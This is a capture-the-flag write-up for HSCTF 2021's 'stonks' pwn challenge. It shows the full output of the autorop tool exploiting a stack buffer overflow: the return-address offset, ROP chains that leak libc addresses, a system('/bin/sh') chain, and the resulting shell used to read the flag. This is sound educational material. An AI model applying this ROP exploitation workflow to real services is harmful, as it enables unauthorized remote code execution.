# stonks (231 solves, 391 points)

## Description  
check out my cool stock predictor!

`nc stonks.hsc.tf 1337`

## Solution  
Disclosure: There is no technical "pwning" done in this solution since we're
bad at pwn

Once we connect, we can do some initial fuzzing with different characters and
lengths, and we find that we can crash it with a simple buffer overflow (which
explains the large # of solves as well). Now, we could go into gdb and write
an exploit manually, but since I'm a script kiddie I decided to use
[autorop](https://github.com/mariuszskon/autorop) which is a great tool for
simple pwns like this. Following the syntax, we are brought to an interactive
shell as shown below.

```  
pranav@pranav-VirtualBox:~/Desktop/autorop$ autorop chal stonks.hsc.tf 1337  
[*] '/home/pranav/Desktop/autorop/chal'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
[+] Opening connection to stonks.hsc.tf on port 1337: Done  
[*] Produced pipeline: pipeline_instance(<function corefile at
0x7f44081168b0>, <function puts at 0x7f4408116b80>, <function auto at
0x7f4408116dc0>, <function system_binsh at 0x7f4408116a60>)  
[*] Pipeline [1/4]: corefile  
[!] Could not find executable 'chal' in $PATH, using './chal' instead  
[+] Starting local process './chal': pid 3380  
[*] Process './chal' stopped with exit code -11 (SIGSEGV) (pid 3380)  
[+] Receiving all data: Done (57B)  
[!] Error parsing corefile stack: Found bad environment at 0x7ffda6504fdd  
[+] Parsing corefile...: Done  
[*] '/home/pranav/Desktop/autorop/core.3380'  
   Arch:      amd64-64-little  
   RIP:       0x4012c2  
   RSP:       0x7ffda6503838  
   Exe:       '/home/pranav/Desktop/autorop/chal' (0x400000)  
   Fault:     0x6161616161616166  
[*] Fault address @ 0x6161616161616166  
[*] Offset to return address is 40  
[*] Pipeline [2/4]: puts  
[+] Opening connection to stonks.hsc.tf on port 1337: Done  
[*] Loaded 14 cached gadgets for 'chal'  
[*] 0x0000:         0x40101a ret  
   0x0008:         0x401363 pop rdi; ret  
   0x0010:         0x403ff0 [arg0] rdi = __libc_start_main  
   0x0018:         0x401094 puts  
   0x0020:         0x40101a ret  
   0x0028:         0x401363 pop rdi; ret  
   0x0030:         0x404018 [arg0] rdi = got.puts  
   0x0038:         0x401094 puts  
   0x0040:         0x40101a ret  
   0x0048:         0x4012c3 main()  
[*] leaked __libc_start_main @ 0x7f87508b1fc0  
[*] leaked puts @ 0x7f87509125a0  
[*] Pipeline [3/4]: auto  
[*] Searching for libc based on leaks using libc.rip  
[!] 6 matching libc's found, picking first one  
[*] Downloading libc  
[*] '/home/pranav/Desktop/autorop/.autorop.libc'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[*] Pipeline [4/4]: system_binsh  
[*] Loaded 201 cached gadgets for '.autorop.libc'  
[*] 0x0000:         0x40101a ret  
   0x0008:         0x401363 pop rdi; ret  
   0x0010:   0x7f8750a425aa [arg0] rdi = 140219150247338  
   0x0018:         0x4010a4 system  
   0x0020:         0x40101a ret  
   0x0028:         0x4012c3 main()  
[*] Switching to interactive mode  
Please enter the stock ticker symbol: aaaaaaaabaaaaaaacaaaaaaadaaa\x06will
increase by $6 today!  
$ ls  
bin  
boot  
dev  
etc  
flag  
home  
lib  
lib32  
lib64  
libx32  
media  
mnt  
opt  
proc  
root  
run  
sbin  
srv  
sys  
tmp  
usr  
var  
$ cat flag  
flag{to_the_moon}  
```  
As shown above, once we get to the interactive shell, all we have to do is
`ls` and  `cat flag`, allowing us to solve this challenge in under a minute.
Clearly, sometimes being a script kiddie does pay off.

## Flag  
`flag{to_the_moon}`

Original writeup (https://github.com/BASHing-thru-
challenges/HSCTF-2021-Writeups/tree/main/pwn/stonks).